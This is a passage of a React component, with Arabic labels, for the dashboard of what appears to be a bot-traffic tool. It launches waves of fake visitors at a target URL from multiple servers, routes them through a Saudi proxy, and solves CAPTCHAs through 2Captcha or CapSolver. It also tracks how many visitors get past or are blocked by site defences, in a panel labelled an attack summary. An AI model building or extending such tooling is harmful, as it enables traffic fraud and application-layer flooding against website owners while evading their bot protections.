          <div style={{ textAlign:'center', padding:'10px', marginBottom:'12px', backgroundColor: remainingSeconds === 0 ? '#052e16' : '#1a1a2e', border:`1px solid ${remainingSeconds === 0 ? '#22c55e' : '#facc15'}`, borderRadius:'8px' }}>
            <div style={{ fontSize:'22px', fontWeight:'bold', color: remainingSeconds === 0 ? '#22c55e' : '#facc15' }}>
              {remainingSeconds === 0 ? '✅ انتهى!' : `⏳ ${formatDuration(remainingSeconds)}`}
            </div>
          </div>
        )}

        {/* Stats Preview */}
        {(phase === 'running' || phase === 'finished') && (
          <div style={{ display:'grid', gridTemplateColumns:'repeat(4, 1fr)', gap:'8px', marginBottom:'14px', padding:'10px', backgroundColor:'#0a1628', borderRadius:'8px', border:'1px solid #1e3a5f' }}>
            <div style={{ textAlign:'center' }}>
              <div style={{ fontSize:'18px', fontWeight:'bold', color:'#06b6d4' }}>{totalVisitsEstimate.toLocaleString()}</div>
              <div style={{ fontSize:'9px', color:'#6b7280' }}>إجمالي الزيارات</div>
            </div>
            <div style={{ textAlign:'center' }}>
              <div style={{ fontSize:'18px', fontWeight:'bold', color:'#22c55e' }}>👥 {totalActiveVisitors || activeVisitorsEstimate}</div>
              <div style={{ fontSize:'9px', color:'#6b7280' }}>زائر نشط</div>
            </div>
            <div style={{ textAlign:'center' }}>
              <div style={{ fontSize:'18px', fontWeight:'bold', color:'#facc15' }}>🌊 {totalWaves * servers.length}</div>
              <div style={{ fontSize:'9px', color:'#6b7280' }}>إجمالي الموجات</div>
            </div>
            <div style={{ textAlign:'center' }}>
              <div style={{ fontSize:'18px', fontWeight:'bold', color:'#a855f7' }}>{stayTime}s</div>
              <div style={{ fontSize:'9px', color:'#6b7280' }}>مدة بقاء الزائر</div>
            </div>
          </div>
        )}

        {/* ===== LIVE MONITORING ===== */}
        {(serverStatus.length > 0 || monitoring) && (
          <div style={{ marginTop:'10px', border:'1px solid #14532d', borderRadius:'8px', padding:'14px', backgroundColor:'#0a0a0a' }}>
            <div style={{ display:'flex', justifyContent:'space-between', alignItems:'center', marginBottom:'12px' }}>
              <span style={{ fontSize:'14px', color:'#22c55e' }}>📡 المراقبة الحية {monitoring && <span style={{ color:'#22c55e', fontSize:'11px' }}>(كل 15ث)</span>}</span>
              <div style={{ display:'flex', gap:'6px' }}>
                {!monitoring && <button onClick={startMonitoring} style={{ fontSize:'11px', color:'#22c55e', cursor:'pointer', background:'none', border:'1px solid #22c55e', padding:'3px 10px', borderRadius:'4px', fontFamily:ff }}>▶</button>}
                {monitoring && <button onClick={stopMonitoring} style={{ fontSize:'11px', color:'#ef4444', cursor:'pointer', background:'none', border:'1px solid #ef4444', padding:'3px 10px', borderRadius:'4px', fontFamily:ff }}>⏹</button>}
                <button onClick={fetchStatus} style={{ fontSize:'11px', color:'#6b7280', cursor:'pointer', background:'none', border:'1px solid #374151', padding:'3px 10px', borderRadius:'4px', fontFamily:ff }}>🔄</button>
              </div>
            </div>

            {/* Active Visitors Banner - Shows verified + blocked */}
            <div style={{ display:'grid', gridTemplateColumns:'1fr 1fr 1fr', gap:'8px', marginBottom:'10px' }}>
              <div style={{ textAlign:'center', padding:'14px', backgroundColor: totalVerifiedVisitors > 0 ? '#052e16' : '#1a1a2e', border:`1px solid ${totalVerifiedVisitors > 0 ? '#22c55e' : '#374151'}`, borderRadius:'8px' }}>
                <div style={{ fontSize:'28px', fontWeight:'bold', color: totalVerifiedVisitors > 0 ? '#22c55e' : '#6b7280' }}>✅ {totalVerifiedVisitors}</div>
                <div style={{ fontSize:'11px', color: totalVerifiedVisitors > 0 ? '#4ade80' : '#6b7280' }}>زائر متحقق الآن</div>
              </div>
              <div style={{ textAlign:'center', padding:'14px', backgroundColor: totalActiveVisitors > 0 ? '#0a1628' : '#1a1a2e', border:`1px solid ${totalActiveVisitors > 0 ? '#06b6d4' : '#374151'}`, borderRadius:'8px' }}>
                <div style={{ fontSize:'28px', fontWeight:'bold', color: totalActiveVisitors > 0 ? '#06b6d4' : '#6b7280' }}>👥 {totalActiveVisitors}</div>
                <div style={{ fontSize:'11px', color: totalActiveVisitors > 0 ? '#67e8f9' : '#6b7280' }}>إجمالي نشط</div>
              </div>
              <div style={{ textAlign:'center', padding:'14px', backgroundColor: totalBlockedVisitors > 0 ? '#450a0a' : '#1a1a2e', border:`1px solid ${totalBlockedVisitors > 0 ? '#ef4444' : '#374151'}`, borderRadius:'8px' }}>
                <div style={{ fontSize:'28px', fontWeight:'bold', color: totalBlockedVisitors > 0 ? '#ef4444' : '#6b7280' }}>🚫 {totalBlockedVisitors}</div>
                <div style={{ fontSize:'11px', color: totalBlockedVisitors > 0 ? '#fca5a5' : '#6b7280' }}>محظور</div>
              </div>
            </div>

            {/* Server Cards */}
            {serverStatus.map((sv, i) => (
              <div key={i} style={st.card}>
                <div style={{ display:'flex', justifyContent:'space-between', alignItems:'center', marginBottom:'10px' }}>
                  <span style={{ fontSize:'13px', color:'#9ca3af' }}>🖥️ {sv.host}</span>
                  <div style={{ display:'flex', gap:'6px', alignItems:'center' }}>
                    {sv.mode && <span style={st.badge(getModeColor(sv.mode))}>{getModeText(sv.mode)}</span>}
                    <span style={st.badge(getStatusColor(sv.status))}>{getStatusText(sv.status)}</span>
                  </div>
                </div>
                {sv.active_visitors > 0 && <div style={{ fontSize:'11px', color:'#06b6d4', textAlign:'center', marginBottom:'6px' }}>✅ {sv.verified_visitors || 0} متحقق | 👥 {sv.active_visitors} نشط | 🚫 {sv.blocked_visitors || 0} محظور | 🌊 {sv.waves_done || 0}/{sv.total_waves || 0}</div>}
                {sv.rate > 0 && <div style={{ fontSize:'11px', color:'#4ade80', textAlign:'center', marginBottom:'6px' }}>⚡ {sv.rate}/دقيقة</div>}
                {sv.status !== 'offline' && sv.status !== 'idle' && (
                  <>
                    <div style={{ display:'grid', gridTemplateColumns:'repeat(4, 1fr)', gap:'6px', marginBottom:'8px' }}>
                      {[
                        { v: (sv.visits||0).toLocaleString(), l:'زيارات', c:'#fff' },
                        { v: (sv.target||0).toLocaleString(), l:'الهدف', c:'#fff' },
                        { v: formatTime(sv.elapsed||0), l:'الوقت', c:'#4ade80' },
                        { v: sv.errors||0, l:'أخطاء', c: (sv.errors||0) > 0 ? '#ef4444' : '#22c55e' },
                      ].map((x, j) => (
                        <div key={j} style={{ textAlign:'center', padding:'6px', backgroundColor:'#000', borderRadius:'6px', border:'1px solid #1f2937' }}>
                          <div style={{ fontSize:'16px', fontWeight:'bold', color:x.c }}>{x.v}</div>
                          <div style={{ fontSize:'9px', color:'#6b7280' }}>{x.l}</div>
                        </div>
                      ))}
                    </div>
                    <div style={{ width:'100%', height:'6px', backgroundColor:'#1f2937', borderRadius:'4px', overflow:'hidden' }}>
                      <div style={{ height:'100%', borderRadius:'4px', width:`${sv.progress||0}%`, backgroundColor: sv.status === 'finished' ? '#3b82f6' : '#22c55e', transition:'width 0.5s' }}></div>
                    </div>
                    <div style={{ textAlign:'center', fontSize:'11px', color:'#9ca3af', marginTop:'3px' }}>{sv.progress||0}%</div>
                  </>
                )}
                {sv.status === 'offline' && <div style={{ color:'#ef4444', fontSize:'11px' }}>❌ {sv.error || 'غير متصل'}</div>}
              </div>
            ))}

            {/* Totals */}
            {serverStatus.some(x => x.visits > 0) && (
              <div style={{ display:'grid', gridTemplateColumns:'repeat(3, 1fr)', gap:'10px', marginTop:'12px', padding:'10px', backgroundColor:'#111827', borderRadius:'8px', border:'1px solid #166534' }}>
                {[
                  { v: totalVisits.toLocaleString(), l:'إجمالي الزيارات', c:'#22c55e' },
                  { v: totalVisitsEstimate.toLocaleString(), l:'الهدف', c:'#9ca3af' },
                  { v: totalErrors, l:'أخطاء', c: totalErrors > 0 ? '#ef4444' : '#22c55e' },
                ].map((x, i) => (
                  <div key={i} style={{ textAlign:'center' }}>
                    <div style={{ fontSize:'22px', fontWeight:'bold', color:x.c }}>{x.v}</div>
                    <div style={{ fontSize:'11px', color:'#9ca3af' }}>{x.l}</div>
                  </div>
                ))}
              </div>
            )}
            {/* Verified vs Blocked Bar */}
            {serverStatus.some(x => x.visits > 0) && (totalVerifiedVisitors > 0 || totalBlockedVisitors > 0) && (
              <div style={{ marginTop:'8px', padding:'8px', backgroundColor:'#111827', borderRadius:'8px', border:'1px solid #166534' }}>
                <div style={{ display:'flex', justifyContent:'space-between', marginBottom:'4px' }}>
                  <span style={{ fontSize:'11px', color:'#22c55e' }}>✅ متحقق: {totalVerifiedVisitors}</span>
                  <span style={{ fontSize:'11px', color:'#ef4444' }}>🚫 محظور: {totalBlockedVisitors}</span>
                </div>
                <div style={{ width:'100%', height:'8px', backgroundColor:'#1f2937', borderRadius:'4px', overflow:'hidden', display:'flex' }}>
                  <div style={{ height:'100%', backgroundColor:'#22c55e', width:`${totalActiveVisitors > 0 ? (totalVerifiedVisitors / totalActiveVisitors * 100) : 0}%`, transition:'width 0.5s' }}></div>
                  <div style={{ height:'100%', backgroundColor:'#ef4444', width:`${totalActiveVisitors > 0 ? (totalBlockedVisitors / totalActiveVisitors * 100) : 0}%`, transition:'width 0.5s' }}></div>
                </div>
                <div style={{ textAlign:'center', fontSize:'10px', color:'#9ca3af', marginTop:'4px' }}>
                  نسبة النجاح: {totalActiveVisitors > 0 ? ((totalVerifiedVisitors / totalActiveVisitors) * 100).toFixed(1) : 0}%
                </div>
              </div>
            )}

            {/* Summary */}
            {attackSummary && (
              <div style={{ marginTop:'14px', padding:'16px', backgroundColor:'#0f172a', border:'2px solid #22c55e', borderRadius:'12px', textAlign:'center' }}>
                <div style={{ fontSize:'16px', color:'#22c55e', marginBottom:'12px', fontWeight:'bold' }}>✅ ملخص العملية</div>
                <div style={{ display:'grid', gridTemplateColumns:'repeat(5, 1fr)', gap:'8px' }}>
                  {[
                    { v: attackSummary.target.toLocaleString(), l:'الهدف', c:'#3b82f6' },
                    { v: attackSummary.visits.toLocaleString(), l:'ناجحة', c:'#22c55e' },
                    { v: attackSummary.errors.toLocaleString(), l:'فاشلة', c: attackSummary.errors > 0 ? '#ef4444' : '#22c55e' },
                    { v: formatTime(attackSummary.elapsed), l:'الوقت', c:'#facc15' },
                    { v: attackSummary.rate.toLocaleString(), l:'زيارة/دقيقة', c:'#a855f7' },
                  ].map((x, i) => (
                    <div key={i} style={{ padding:'10px', backgroundColor:'#111827', borderRadius:'8px', border:'1px solid #1f2937' }}>
                      <div style={{ fontSize:'20px', fontWeight:'bold', color:x.c }}>{x.v}</div>
                      <div style={{ fontSize:'10px', color:'#9ca3af', marginTop:'3px' }}>{x.l}</div>
                    </div>
                  ))}
                </div>
                {/* Verified vs Blocked Summary */}
                <div style={{ display:'grid', gridTemplateColumns:'repeat(3, 1fr)', gap:'8px', marginTop:'10px' }}>
                  <div style={{ padding:'10px', backgroundColor:'#052e16', borderRadius:'8px', border:'1px solid #22c55e' }}>
                    <div style={{ fontSize:'20px', fontWeight:'bold', color:'#22c55e' }}>✅ {(attackSummary.verifiedVisitors || 0).toLocaleString()}</div>
                    <div style={{ fontSize:'10px', color:'#4ade80', marginTop:'3px' }}>زيارات متحققة</div>
                  </div>
                  <div style={{ padding:'10px', backgroundColor:'#450a0a', borderRadius:'8px', border:'1px solid #ef4444' }}>
                    <div style={{ fontSize:'20px', fontWeight:'bold', color:'#ef4444' }}>🚫 {(attackSummary.blockedVisitors || 0).toLocaleString()}</div>
                    <div style={{ fontSize:'10px', color:'#fca5a5', marginTop:'3px' }}>محظورة</div>
                  </div>
                  <div style={{ padding:'10px', backgroundColor:'#111827', borderRadius:'8px', border:'1px solid #f97316' }}>
                    <div style={{ fontSize:'20px', fontWeight:'bold', color:'#f97316' }}>👥 {(attackSummary.peakVerified || 0).toLocaleString()}</div>
                    <div style={{ fontSize:'10px', color:'#fb923c', marginTop:'3px' }}>أعلى متحقق</div>
                  </div>
                </div>
                {attackSummary.peakActive > 0 && (
                  <div style={{ marginTop:'8px', fontSize:'12px', color:'#06b6d4' }}>👥 أعلى عدد نشط: {attackSummary.peakActive}</div>
                )}
              </div>
            )}

            {/* ===== DETAILED REPORT (appears when finished) ===== */}
            {phase === 'finished' && serverStatus.length > 0 && (() => {
              const finishedServers = serverStatus.filter(s => s.status === 'finished');
              if (finishedServers.length === 0) return null;
              const totalVisitsReport = finishedServers.reduce((sum, s) => sum + (s.visits || 0), 0);
              const totalErrorsReport = finishedServers.reduce((sum, s) => sum + (s.errors || 0), 0);
              const totalTargetReport = finishedServers.reduce((sum, s) => sum + (s.target || 0), 0);
              const totalUniqueIPs = finishedServers.reduce((sum, s) => sum + (s.unique_ips || 0), 0);
              const maxElapsedReport = Math.max(...finishedServers.map(s => s.elapsed || 0), 0);
              const overallRate = maxElapsedReport > 0 ? Math.round((totalVisitsReport / maxElapsedReport) * 60) : 0;
              const successRate = totalTargetReport > 0 ? ((totalVisitsReport / totalTargetReport) * 100).toFixed(1) : 0;
              const peakActiveReport = Math.max(...finishedServers.map(s => s.peak_active || 0), 0);
              const totalVerifiedReport = finishedServers.reduce((sum, s) => sum + (s.verified_visitors || 0), 0);
              const totalBlockedReport = finishedServers.reduce((sum, s) => sum + (s.blocked_visitors || 0), 0);
              const peakVerifiedReport = Math.max(...finishedServers.map(s => s.peak_verified || 0), 0);
              const verifiedRate = totalVisitsReport > 0 ? ((totalVerifiedReport / totalVisitsReport) * 100).toFixed(1) : 0;
              return (
                <div style={{ marginTop:'14px', padding:'16px', backgroundColor:'#0c1222', border:'2px solid #3b82f6', borderRadius:'12px' }}>
                  <div style={{ fontSize:'16px', color:'#3b82f6', marginBottom:'14px', fontWeight:'bold', textAlign:'center' }}>📊 التقرير المفصل</div>
                  
                  {/* Overall Stats Grid */}
                  <div style={{ display:'grid', gridTemplateColumns:'repeat(4, 1fr)', gap:'8px', marginBottom:'14px' }}>
                    {[
                      { v: totalVisitsReport.toLocaleString(), l:'إجمالي الزيارات', c:'#22c55e', icon:'✅' },
                      { v: totalErrorsReport.toLocaleString(), l:'إجمالي الأخطاء', c: totalErrorsReport > 0 ? '#ef4444' : '#22c55e', icon:'❌' },
                      { v: `${successRate}%`, l:'نسبة النجاح', c: parseFloat(successRate) > 90 ? '#22c55e' : parseFloat(successRate) > 70 ? '#facc15' : '#ef4444', icon:'📈' },
                      { v: totalUniqueIPs.toLocaleString(), l:'IPs فريدة', c:'#a855f7', icon:'🌍' },
                    ].map((x, i) => (
                      <div key={i} style={{ textAlign:'center', padding:'10px', backgroundColor:'#111827', borderRadius:'8px', border:'1px solid #1f2937' }}>
                        <div style={{ fontSize:'10px', marginBottom:'4px' }}>{x.icon}</div>
                        <div style={{ fontSize:'18px', fontWeight:'bold', color:x.c }}>{x.v}</div>
                        <div style={{ fontSize:'9px', color:'#9ca3af', marginTop:'3px' }}>{x.l}</div>
                      </div>
                    ))}
                  </div>

                  <div style={{ display:'grid', gridTemplateColumns:'repeat(4, 1fr)', gap:'8px', marginBottom:'14px' }}>
                    {[
                      { v: overallRate.toLocaleString(), l:'زيارة/دقيقة', c:'#06b6d4', icon:'⚡' },
                      { v: peakActiveReport.toLocaleString(), l:'أعلى نشط', c:'#f97316', icon:'👥' },
                      { v: formatTime(maxElapsedReport), l:'المدة الإجمالية', c:'#facc15', icon:'⏱️' },
                      { v: finishedServers.length.toString(), l:'سيرفرات نشطة', c:'#22c55e', icon:'🖥️' },
                    ].map((x, i) => (
                      <div key={i} style={{ textAlign:'center', padding:'10px', backgroundColor:'#111827', borderRadius:'8px', border:'1px solid #1f2937' }}>
                        <div style={{ fontSize:'10px', marginBottom:'4px' }}>{x.icon}</div>
                        <div style={{ fontSize:'18px', fontWeight:'bold', color:x.c }}>{x.v}</div>
                        <div style={{ fontSize:'9px', color:'#9ca3af', marginTop:'3px' }}>{x.l}</div>
                      </div>
                    ))}
                  </div>

                  {/* Verified vs Blocked Report */}
                  <div style={{ display:'grid', gridTemplateColumns:'repeat(4, 1fr)', gap:'8px', marginBottom:'14px' }}>
                    {[
                      { v: totalVerifiedReport.toLocaleString(), l:'زيارات متحققة', c:'#22c55e', icon:'✅' },
                      { v: totalBlockedReport.toLocaleString(), l:'محظورة', c:'#ef4444', icon:'🚫' },
                      { v: `${verifiedRate}%`, l:'نسبة التحقق', c: parseFloat(verifiedRate) > 70 ? '#22c55e' : parseFloat(verifiedRate) > 40 ? '#facc15' : '#ef4444', icon:'📊' },
                      { v: peakVerifiedReport.toLocaleString(), l:'أعلى متحقق', c:'#a78bfa', icon:'🚀' },
                    ].map((x, i) => (
                      <div key={i} style={{ textAlign:'center', padding:'10px', backgroundColor:'#111827', borderRadius:'8px', border:'1px solid #1f2937' }}>
                        <div style={{ fontSize:'10px', marginBottom:'4px' }}>{x.icon}</div>
                        <div style={{ fontSize:'18px', fontWeight:'bold', color:x.c }}>{x.v}</div>
                        <div style={{ fontSize:'9px', color:'#9ca3af', marginTop:'3px' }}>{x.l}</div>
                      </div>
                    ))}
                  </div>

                  {/* Per-Server Table */}
                  <div style={{ fontSize:'13px', color:'#3b82f6', marginBottom:'8px', fontWeight:'bold' }}>📋 تفاصيل كل سيرفر</div>
                  <div style={{ overflowX:'auto' }}>
                    <table style={{ width:'100%', borderCollapse:'collapse', fontSize:'11px' }}>
                      <thead>
                        <tr style={{ backgroundColor:'#1e293b' }}>
                          {['السيرفر','الوضع','الزيارات','متحقق','محظور','الأخطاء','IPs','السرعة','الوقت'].map((h, i) => (
                            <th key={i} style={{ padding:'8px 4px', color:'#9ca3af', borderBottom:'1px solid #374151', textAlign:'center', whiteSpace:'nowrap' }}>{h}</th>
                          ))}
                        </tr>
                      </thead>
                      <tbody>
                        {finishedServers.map((sv, i) => {
                          const svSuccess = sv.target > 0 ? ((sv.visits / sv.target) * 100).toFixed(0) : 0;
                          return (
                            <tr key={i} style={{ backgroundColor: i % 2 === 0 ? '#0f172a' : '#111827' }}>
                              <td style={{ padding:'6px 4px', color:'#9ca3af', textAlign:'center', borderBottom:'1px solid #1f2937' }}>{sv.host?.split('.').slice(-2).join('.')}</td>
                              <td style={{ padding:'6px 4px', textAlign:'center', borderBottom:'1px solid #1f2937' }}><span style={{ color:'#22c55e', fontSize:'10px' }}>{sv.mode || '-'}</span></td>
                              <td style={{ padding:'6px 4px', color:'#22c55e', textAlign:'center', fontWeight:'bold', borderBottom:'1px solid #1f2937' }}>{(sv.visits||0).toLocaleString()}</td>
                              <td style={{ padding:'6px 4px', color:'#4ade80', textAlign:'center', borderBottom:'1px solid #1f2937' }}>{sv.verified_visitors||0}</td>
                              <td style={{ padding:'6px 4px', color: (sv.blocked_visitors||0) > 0 ? '#ef4444' : '#22c55e', textAlign:'center', borderBottom:'1px solid #1f2937' }}>{sv.blocked_visitors||0}</td>
                              <td style={{ padding:'6px 4px', color: (sv.errors||0) > 0 ? '#ef4444' : '#22c55e', textAlign:'center', borderBottom:'1px solid #1f2937' }}>{sv.errors||0}</td>
                              <td style={{ padding:'6px 4px', color:'#a855f7', textAlign:'center', borderBottom:'1px solid #1f2937' }}>{sv.unique_ips||0}</td>
                              <td style={{ padding:'6px 4px', color:'#06b6d4', textAlign:'center', borderBottom:'1px solid #1f2937' }}>{sv.rate||0}/م</td>
                              <td style={{ padding:'6px 4px', color:'#facc15', textAlign:'center', borderBottom:'1px solid #1f2937' }}>{formatTime(sv.elapsed||0)}</td>
                            </tr>
                          );
                        })}
                      </tbody>
                    </table>
                  </div>

                  {/* Target info */}
                  <div style={{ marginTop:'12px', padding:'8px', backgroundColor:'#111827', borderRadius:'8px', border:'1px solid #1f2937', textAlign:'center' }}>
                    <div style={{ fontSize:'11px', color:'#6b7280' }}>🎯 الهدف: <span style={{ color:'#06b6d4' }}>{url || '-'}</span></div>
                    <div style={{ fontSize:'10px', color:'#4b5563', marginTop:'4px' }}>⏰ {new Date().toLocaleString('ar-SA')}</div>
                  </div>
                </div>
              );
            })()}
          </div>
        )}

        {/* ===== ADVANCED SETTINGS (hidden by default) ===== */}
        <div style={{ marginTop:'16px' }}>
          <button onClick={() => setShowAdvanced(!showAdvanced)} style={{ display:'flex', alignItems:'center', gap:'6px', fontSize:'13px', color:'#6b7280', cursor:'pointer', background:'none', border:'1px solid #374151', padding:'8px 16px', borderRadius:'8px', fontFamily:ff, width:'100%', justifyContent:'center' }}>
            ⚙️ إعدادات متقدمة {showAdvanced ? '▲' : '▼'}
          </button>

          {showAdvanced && (
            <div style={{ marginTop:'12px', border:'1px solid #374151', borderRadius:'8px', padding:'16px', backgroundColor:'#0a0a0a' }}>

              {/* API Key */}
              <div style={{ marginBottom:'14px' }}>
                <div style={{ display:'flex', alignItems:'center', gap:'8px', marginBottom:'6px' }}>
                  <label style={{ fontSize:'13px', color:'#ef4444' }}>🔑 مفتاح الدخول</label>
                  <span style={{ fontSize:'11px', color: panelApiKey ? '#22c55e' : '#ef4444' }}>{panelApiKey ? '🔒 مُدخل' : '⚠️ مطلوب'}</span>
                </div>
                <div style={{ position:'relative' }}>
                  <input type={showApiKey ? 'text' : 'password'} value={panelApiKey} onChange={(e) => setPanelApiKey(e.target.value)} placeholder="API Key..." style={{...st.input, borderColor: panelApiKey ? '#22c55e' : '#ef4444', paddingLeft:'36px'}} />
                  <button onClick={() => setShowApiKey(!showApiKey)} style={{ position:'absolute', left:'8px', top:'50%', transform:'translateY(-50%)', background:'none', border:'none', cursor:'pointer', fontSize:'18px', padding:'0', lineHeight:'1' }}>{showApiKey ? '🙈' : '👁️'}</button>
                </div>
              </div>

              {/* Wave & Stay settings */}
              <div style={{ display:'grid', gridTemplateColumns:'1fr 1fr', gap:'10px', marginBottom:'14px' }}>
                <div>
                  <label style={st.label}>🌊 حجم الموجة</label>
                  <input type="number" value={waveSize} onChange={(e) => setWaveSize(e.target.value)} min="10" max="500" style={{...st.input, textAlign:'center'}} />
                </div>
                <div>
                  <label style={st.label}>⏳ مدة البقاء (ثانية)</label>
                  <input type="number" value={stayTime} onChange={(e) => setStayTime(e.target.value)} min="10" max="120" style={{...st.input, textAlign:'center'}} />
                </div>
              </div>

              {/* Servers */}
              <div style={{ marginBottom:'14px' }}>
                <button onClick={() => setShowServerPanel(!showServerPanel)} style={{ display:'flex', alignItems:'center', gap:'6px', fontSize:'13px', color:'#facc15', cursor:'pointer', background:'none', border:'none', fontFamily:ff }}>
                  🖥️ السيرفرات ({servers.length}) {showServerPanel ? '▲' : '▼'}
                </button>
                {showServerPanel && (
                  <div style={{ border:'1px solid #14532d', borderRadius:'8px', padding:'12px', marginTop:'8px', backgroundColor:'#000' }}>
                    {servers.map((sv, i) => (
                      <div key={i} style={{ display:'flex', alignItems:'center', justifyContent:'space-between', backgroundColor:'#111827', padding:'6px 10px', borderRadius:'6px', fontSize:'13px', color:'#4ade80', marginBottom:'6px' }}>
                        <span>🖥️ {sv.host}</span>
                        <button onClick={() => removeServer(sv.host)} style={{ color:'#ef4444', cursor:'pointer', background:'none', border:'none', fontSize:'14px' }}>🗑️</button>
                      </div>
                    ))}
                    <div style={{ display:'flex', gap:'6px', marginTop:'8px' }}>
                      <input type="text" value={newHost} onChange={(e) => setNewHost(e.target.value)} placeholder="IP" style={{...st.input, flex:1}} />
                      <button onClick={addServer} style={st.btn('#14532d')}>+ إضافة</button>
                    </div>
                  </div>
                )}
              </div>

              {/* Proxy */}
              <div style={{ marginBottom:'14px' }}>
                <div style={{ display:'flex', alignItems:'center', gap:'10px', marginBottom:'8px' }}>
                  <label style={{ fontSize:'13px', color:'#22c55e' }}>🌐 بروكسي سعودي</label>
                  <button onClick={() => setUseProxy(!useProxy)} style={{ background: useProxy ? '#22c55e' : '#374151', color:'#fff', border:'none', padding:'3px 14px', borderRadius:'12px', cursor:'pointer', fontSize:'11px', fontFamily:ff }}>
                    {useProxy ? '✅ مفعّل' : '❌ معطّل'}
                  </button>
                  {useProxy && proxyStatus === 'active' && <span style={{ background:'#166534', color:'#4ade80', padding:'3px 10px', borderRadius:'12px', fontSize:'11px' }}>✅ شغال</span>}
                  {useProxy && proxyStatus === 'expired' && <span style={{ background:'#dc2626', color:'#fff', padding:'3px 10px', borderRadius:'12px', fontSize:'11px' }}>⚠️ منتهي</span>}
                </div>
                {useProxy && (
                  <div style={{ border:'1px solid #14532d', borderRadius:'8px', padding:'12px', backgroundColor:'#000' }}>
                    <div style={{ display:'grid', gridTemplateColumns:'2fr 1fr', gap:'6px', marginBottom:'6px' }}>
                      <div><label style={{ fontSize:'10px', color:'#6b7280' }}>Host</label><input type="text" value={proxyHost} onChange={(e) => setProxyHost(e.target.value)} style={st.input} /></div>
                      <div><label style={{ fontSize:'10px', color:'#6b7280' }}>Port</label><input type="text" value={proxyPort} onChange={(e) => setProxyPort(e.target.value)} style={st.input} /></div>
                    </div>
                    <div style={{ display:'grid', gridTemplateColumns:'1fr 1fr', gap:'6px' }}>
                      <div><label style={{ fontSize:'10px', color:'#6b7280' }}>Username</label><input type="text" value={proxyUser} onChange={(e) => setProxyUser(e.target.value)} style={st.input} /></div>
                      <div><label style={{ fontSize:'10px', color:'#6b7280' }}>Password</label><input type="text" value={proxyPass} onChange={(e) => setProxyPass(e.target.value)} style={st.input} /></div>
                    </div>
                  </div>
                )}
              </div>

              {/* Socket URL */}
              <div style={{ marginBottom:'14px' }}>
                <label style={{...st.label, color:'#06b6d4'}}>🔌 Socket URL (اختياري)</label>
                <input type="text" value={socketUrl} onChange={(e) => setSocketUrl(e.target.value)} placeholder="https://server.onrender.com (يُكتشف تلقائياً)" style={{...st.input, borderColor: socketUrl ? '#06b6d4' : '#166534'}} />
              </div>

              {/* CAPTCHA */}
              <div style={{ marginBottom:'14px' }}>
                <label style={{...st.label, color:'#f59e0b'}}>🔑 CAPTCHA Solver (اختياري)</label>
                <div style={{ display:'grid', gridTemplateColumns:'2fr 1fr', gap:'8px' }}>
                  <input type="text" value={captchaApiKey} onChange={(e) => setCaptchaApiKey(e.target.value)} placeholder="API Key من 2Captcha أو CapSolver" style={{...st.input, borderColor: captchaApiKey ? '#f59e0b' : '#166534'}} />
                  <select value={captchaService} onChange={(e) => setCaptchaService(e.target.value)} style={{...st.input, borderColor:'#f59e0b'}}>
                    <option value="2captcha">2Captcha</option>
                    <option value="capsolver">CapSolver</option>
                  </select>
                </div>
              </div>

              {/* Setup & Deploy buttons */}
              <div style={{ display:'grid', gridTemplateColumns:'1fr 1fr', gap:'10px' }}>
                <button onClick={handleSetup} disabled={loading} style={{...st.btn('#581c87'), opacity: loading ? 0.5 : 1}}>⚙️ تجهيز السيرفرات</button>
                <button onClick={handleDeploy} disabled={loading} style={{...st.btn('#1e3a5f'), opacity: loading ? 0.5 : 1}}>📤 رفع السكريبت</button>
              </div>
            </div>
          )}
        </div>

        {/* Logs */}
        <div style={{ marginTop:'16px' }}>
          <div style={{ display:'flex', justifyContent:'space-between', marginBottom:'6px' }}>
            <span style={{ fontSize:'13px', color:'#9ca3af' }}>💻 سجل النظام</span>
            <button onClick={() => setLogs([])} style={{ fontSize:'11px', color:'#6b7280', cursor:'pointer', background:'none', border:'none', fontFamily:ff }}>مسح</button>
          </div>
          <div style={{ backgroundColor:'#000', border:'1px solid #14532d', height:'180px', overflowY:'auto', padding:'12px', borderRadius:'6px', fontSize:'11px', fontFamily:ff }}>
            {logs.length === 0 ? <span style={{ color:'#4b5563' }}>بانتظار الأوامر...</span> : logs.map((log, i) => (
              <div key={i} style={{ marginBottom:'3px', borderBottom:'1px solid #111827', paddingBottom:'3px' }}>{log}</div>
            ))}
          </div>
        </div>
      </div>
    </div>
  );
}
